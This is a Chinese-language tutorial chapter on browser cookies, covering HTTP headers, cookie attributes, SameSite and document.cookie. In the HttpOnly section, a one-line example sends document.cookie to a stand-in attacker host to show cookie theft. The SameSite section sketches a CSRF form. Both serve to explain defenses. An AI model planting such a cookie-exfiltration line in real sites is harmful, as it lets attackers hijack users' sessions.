# Cookie

## 概述

Cookie 是伺服器儲存在瀏覽器的一小段文字資訊，一般大小不能超過4KB。瀏覽器每次向伺服器發出請求，就會自動附上這段資訊。

Cookie 主要儲存狀態資訊，以下是一些主要用途。

- 對話（session）管理：儲存登入、購物車等需要記錄的資訊。
- 個性化資訊：儲存使用者的偏好，比如網頁的字型大小、背景色等等。
- 追蹤使用者：記錄和分析使用者行為。

Cookie 不是一種理想的客戶端儲存機制。它的容量很小（4KB），缺乏資料操作介面，而且會影響效能。客戶端儲存應該使用 Web storage API 和 IndexedDB。只有那些每次請求都需要讓伺服器知道的資訊，才應該放在 Cookie 裡面。

每個 Cookie 都有以下幾方面的元資料。

- Cookie 的名字
- Cookie 的值（真正的資料寫在這裡面）
- 到期時間（超過這個時間會失效）
- 所屬域名（預設為當前域名）
- 生效的路徑（預設為當前網址）

舉例來說，使用者訪問網址`www.example.com`，伺服器在瀏覽器寫入一個 Cookie。這個 Cookie 的所屬域名為`www.example.com`，生效路徑為根路徑`/`。如果 Cookie 的生效路徑設為`/forums`，那麼這個 Cookie 只有在訪問`www.example.com/forums`及其子路徑時才有效。以後，瀏覽器訪問某個路徑之前，就會找出對該域名和路徑有效，並且還沒有到期的 Cookie，一起傳送給伺服器。

使用者可以設定瀏覽器不接受 Cookie，也可以設定不向伺服器傳送 Cookie。`window.navigator.cookieEnabled`屬性返回一個布林值，表示瀏覽器是否開啟 Cookie 功能。

```javascript
window.navigator.cookieEnabled // true
```

`document.cookie`屬性返回當前網頁的 Cookie。

```javascript
document.cookie // "id=foo;key=bar"
```

不同瀏覽器對 Cookie 數量和大小的限制，是不一樣的。一般來說，單個域名設定的 Cookie 不應超過30個，每個 Cookie 的大小不能超過4KB。超過限制以後，Cookie 將被忽略，不會被設定。

瀏覽器的同源政策規定，兩個網址只要域名相同，就可以共享 Cookie（參見《同源政策》一章）。注意，這裡不要求協議相同。也就是說，`http://example.com`設定的 Cookie，可以被`https://example.com`讀取。

## Cookie 與 HTTP 協議

Cookie 由 HTTP 協議生成，也主要是供 HTTP 協議使用。

### HTTP 迴應：Cookie 的生成

伺服器如果希望在瀏覽器儲存 Cookie，就要在 HTTP 迴應的頭資訊裡面，放置一個`Set-Cookie`欄位。

```http
Set-Cookie:foo=bar
```

上面程式碼會在瀏覽器儲存一個名為`foo`的 Cookie，它的值為`bar`。

HTTP 迴應可以包含多個`Set-Cookie`欄位，即在瀏覽器生成多個 Cookie。下面是一個例子。

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

除了 Cookie 的值，`Set-Cookie`欄位還可以附加 Cookie 的屬性。

```http
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```

上面的幾個屬性的含義，將在後文解釋。

一個`Set-Cookie`欄位裡面，可以同時包括多個屬性，沒有次序的要求。

```http
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
```

下面是一個例子。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

如果伺服器想改變一個早先設定的 Cookie，必須同時滿足四個條件：Cookie 的`key`、`domain`、`path`和`secure`都匹配。舉例來說，如果原始的 Cookie 是用如下的`Set-Cookie`設定的。

```http
Set-Cookie: key1=value1; domain=example.com; path=/blog
```

改變上面這個 Cookie 的值，就必須使用同樣的`Set-Cookie`。

```http
Set-Cookie: key1=value2; domain=example.com; path=/blog
```

只要有一個屬性不同，就會生成一個全新的 Cookie，而不是替換掉原來那個 Cookie。

```http
Set-Cookie: key1=value2; domain=example.com; path=/
```

上面的命令設定了一個全新的同名 Cookie，但是`path`屬性不一樣。下一次訪問`example.com/blog`的時候，瀏覽器將向伺服器傳送兩個同名的 Cookie。

```http
Cookie: key1=value1; key1=value2
```

上面程式碼的兩個 Cookie 是同名的，匹配越精確的 Cookie 排在越前面。

### HTTP 請求：Cookie 的傳送

瀏覽器向伺服器傳送 HTTP 請求時，每個請求都會帶上相應的 Cookie。也就是說，把伺服器早前儲存在瀏覽器的這段資訊，再發回伺服器。這時要使用 HTTP 頭資訊的`Cookie`欄位。

```http
Cookie: foo=bar
```

上面程式碼會向伺服器傳送名為`foo`的 Cookie，值為`bar`。

`Cookie`欄位可以包含多個 Cookie，使用分號（`;`）分隔。

```http
Cookie: name=value; name2=value2; name3=value3
```

下面是一個例子。

```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

伺服器收到瀏覽器發來的 Cookie 時，有兩點是無法知道的。

- Cookie 的各種屬性，比如何時過期。
- 哪個域名設定的 Cookie，到底是一級域名設的，還是某一個二級域名設的。

## Cookie 的屬性

### Expires，Max-Age

`Expires`屬性指定一個具體的到期時間，到了指定時間以後，瀏覽器就不再保留這個 Cookie。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`進行格式轉換。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

如果不設定該屬性，或者設為`null`，Cookie 只在當前會話（session）有效，瀏覽器視窗一旦關閉，當前 Session 結束，該 Cookie 就會被刪除。另外，瀏覽器根據本地時間，決定 Cookie 是否過期，由於本地時間是不精確的，所以沒有辦法保證 Cookie 一定會在伺服器指定的時間過期。

`Max-Age`屬性指定從現在開始 Cookie 存在的秒數，比如`60 * 60 * 24 * 365`（即一年）。過了這個時間以後，瀏覽器就不再保留這個 Cookie。

如果同時指定了`Expires`和`Max-Age`，那麼`Max-Age`的值將優先生效。

如果`Set-Cookie`欄位沒有指定`Expires`或`Max-Age`屬性，那麼這個 Cookie 就是 Session Cookie，即它只在本次對話存在，一旦使用者關閉瀏覽器，瀏覽器就不會再保留這個 Cookie。

### Domain，Path

`Domain`屬性指定瀏覽器發出 HTTP 請求時，哪些域名要附帶這個 Cookie。如果沒有指定該屬性，瀏覽器會預設將其設為當前域名，這時子域名將不會附帶這個 Cookie。比如，`example.com`不設定 Cookie 的`domain`屬性，那麼`sub.example.com`將不會附帶這個 Cookie。如果指定了`domain`屬性，那麼子域名也會附帶這個 Cookie。如果伺服器指定的域名不屬於當前域名，瀏覽器會拒絕這個 Cookie。

`Path`屬性指定瀏覽器發出 HTTP 請求時，哪些路徑要附帶這個 Cookie。只要瀏覽器發現，`Path`屬性是 HTTP 請求路徑的開頭一部分，就會在頭資訊裡面帶上這個 Cookie。比如，`PATH`屬性是`/`，那麼請求`/docs`路徑也會包含該 Cookie。當然，前提是域名必須一致。

### Secure，HttpOnly

`Secure`屬性指定瀏覽器只有在加密協議 HTTPS 下，才能將這個 Cookie 傳送到伺服器。另一方面，如果當前協議是 HTTP，瀏覽器會自動忽略伺服器發來的`Secure`屬性。該屬性只是一個開關，不需要指定值。如果通訊是 HTTPS 協議，該開關自動開啟。

`HttpOnly`屬性指定該 Cookie 無法透過 JavaScript 指令碼拿到，主要是`document.cookie`屬性、`XMLHttpRequest`物件和 Request API 都拿不到該屬性。這樣就防止了該 Cookie 被指令碼讀到，只有瀏覽器發出 HTTP 請求時，才會帶上該 Cookie。

```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

上面是跨站點載入的一個惡意指令碼的程式碼，能夠將當前網頁的 Cookie 發往第三方伺服器。如果設定了一個 Cookie 的`HttpOnly`屬性，上面程式碼就不會讀到該 Cookie。

### SameSite

Chrome 51 開始，瀏覽器的 Cookie 新增加了一個`SameSite`屬性，用來防止 CSRF 攻擊和使用者追蹤。

Cookie 往往用來儲存使用者的身份資訊，惡意網站可以設法偽造帶有正確 Cookie 的 HTTP 請求，這就是 CSRF 攻擊。舉例來說，使用者登陸了銀行網站`your-bank.com`，銀行伺服器發來了一個 Cookie。

```http
Set-Cookie:id=a3fWa;
```

使用者後來又訪問了惡意網站`malicious.com`，上面有一個表單。

```html
<form action="your-bank.com/transfer" method="POST">
  ...
</form>
```

使用者一旦被誘騙傳送這個表單，銀行網站就會收到帶有正確 Cookie 的請求。為了防止這種攻擊，表單一般都帶有一個隨機 token，告訴伺服器這是真實請求。

```html
<form action="your-bank.com/transfer" method="POST">
  <input type="hidden" name="token" value="dad3weg34">
  ...
</form>
```

這種第三方網站引導發出的 Cookie，就稱為第三方 Cookie。它除了用於 CSRF 攻擊，還可以用於使用者追蹤。比如，Facebook 在第三方網站插入一張看不見的圖片。

```html
<img src="facebook.com" style="visibility:hidden;">
```

瀏覽器載入上面程式碼時，就會向 Facebook 發出帶有 Cookie 的請求，從而 Facebook 就會知道你是誰，訪問了什麼網站。

Cookie 的`SameSite`屬性用來限制第三方 Cookie，從而減少安全風險。它可以設定三個值。

> - Strict
> - Lax
> - None

**（1）Strict**

`Strict`最為嚴格，完全禁止第三方 Cookie，跨站點時，任何情況下都不會發送 Cookie。換言之，只有當前網頁的 URL 與請求目標一致，才會帶上 Cookie。

```http
Set-Cookie: CookieName=CookieValue; SameSite=Strict;
```

這個規則過於嚴格，可能造成非常不好的使用者體驗。比如，當前網頁有一個 GitHub 連結，使用者點選跳轉就不會帶有 GitHub 的 Cookie，跳轉過去總是未登陸狀態。

**（2）Lax**

`Lax`規則稍稍放寬，大多數情況也是不傳送第三方 Cookie，但是導航到目標網址的 Get 請求除外。

```html
Set-Cookie: CookieName=CookieValue; SameSite=Lax;
```

導航到目標網址的 GET 請求，只包括三種情況：連結，預載入請求，GET 表單。詳見下表。

| 請求型別  |                 示例                 |    正常情況 | Lax         |
|-----------|:------------------------------------:|------------:|-------------|
| 連結      | `<a href="..."></a>`                 | 傳送 Cookie | 傳送 Cookie |
| 預載入    | `<link rel="prerender" href="..."/>` | 傳送 Cookie | 傳送 Cookie |
| GET 表單  | `<form method="GET" action="...">`   | 傳送 Cookie | 傳送 Cookie |
| POST 表單 | `<form method="POST" action="...">`  | 傳送 Cookie | 不傳送      |
| iframe    | `<iframe src="..."></iframe>`        | 傳送 Cookie | 不傳送      |
| AJAX      | `$.get("...")`                       | 傳送 Cookie | 不傳送      |
| Image     | `<img src="...">`                    | 傳送 Cookie | 不傳送      |

設定了`Strict`或`Lax`以後，基本就杜絕了 CSRF 攻擊。當然，前提是使用者瀏覽器支援 SameSite 屬性。

**（3）None**

Chrome 計劃將`Lax`變為預設設定。這時，網站可以選擇顯式關閉`SameSite`屬性，將其設為`None`。不過，前提是必須同時設定`Secure`屬性（Cookie 只能透過 HTTPS 協議傳送），否則無效。

下面的設定無效。

```text
Set-Cookie: widget_session=abc123; SameSite=None
```

下面的設定有效。

```text
Set-Cookie: widget_session=abc123; SameSite=None; Secure
```

## document.cookie

`document.cookie`屬性用於讀寫當前網頁的 Cookie。

讀取的時候，它會返回當前網頁的所有 Cookie，前提是該 Cookie 不能有`HTTPOnly`屬性。

```javascript
document.cookie // "foo=bar;baz=bar"
```

上面程式碼從`document.cookie`一次性讀出兩個 Cookie，它們之間使用分號分隔。必須手動還原，才能取出每一個 Cookie 的值。

```javascript
var cookies = document.cookie.split(';');

for (var i = 0; i < cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
```

`document.cookie`屬性是可寫的，可以透過它為當前網站新增 Cookie。

```javascript
document.cookie = 'fontSize=14';
```

寫入的時候，Cookie 的值必須寫成`key=value`的形式。注意，等號兩邊不能有空格。另外，寫入 Cookie 的時候，必須對分號、逗號和空格進行轉義（它們都不允許作為 Cookie 的值），這可以用`encodeURIComponent`方法達到。

但是，`document.cookie`一次只能寫入一個 Cookie，而且寫入並不是覆蓋，而是新增。

```javascript
document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
```

`document.cookie`讀寫行為的差異（一次可以讀出全部 Cookie，但是隻能寫入一個 Cookie），與 HTTP 協議的 Cookie 通訊格式有關。瀏覽器向伺服器傳送 Cookie 的時候，`Cookie`欄位是使用一行將所有 Cookie 全部發送；伺服器向瀏覽器設定 Cookie 的時候，`Set-Cookie`欄位是一行設定一個 Cookie。

寫入 Cookie 的時候，可以一起寫入 Cookie 的屬性。

```javascript
document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
```

上面程式碼中，寫入 Cookie 的時候，同時設定了`expires`屬性。屬性值的等號兩邊，也是不能有空格的。

各個屬性的寫入注意點如下。

- `path`屬性必須為絕對路徑，預設為當前路徑。
- `domain`屬性值必須是當前傳送 Cookie 的域名的一部分。比如，當前域名是`example.com`，就不能將其設為`foo.com`。該屬性預設為當前的一級域名（不含二級域名）。
- `max-age`屬性的值為秒數。
- `expires`屬性的值為 UTC 格式，可以使用`Date.prototype.toUTCString()`進行日期格式轉換。

`document.cookie`寫入 Cookie 的例子如下。

```javascript
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
```

Cookie 的屬性一旦設定完成，就沒有辦法讀取這些屬性的值。

刪除一個現存 Cookie 的唯一方法，是設定它的`expires`屬性為一個過去的日期。

```javascript
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
```

上面程式碼中，名為`fontSize`的 Cookie 的值為空，過期時間設為1970年1月1月零點，就等同於刪除了這個 Cookie。

## 參考連結

- [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies), by MDN
- [Using the Same-Site Cookie Attribute to Prevent CSRF Attacks](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)
- [SameSite cookies explained](https://web.dev/samesite-cookies-explained)
- [Tough Cookies](https://scotthelme.co.uk/tough-cookies/), Scott Helme
- [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/), Scott Helme

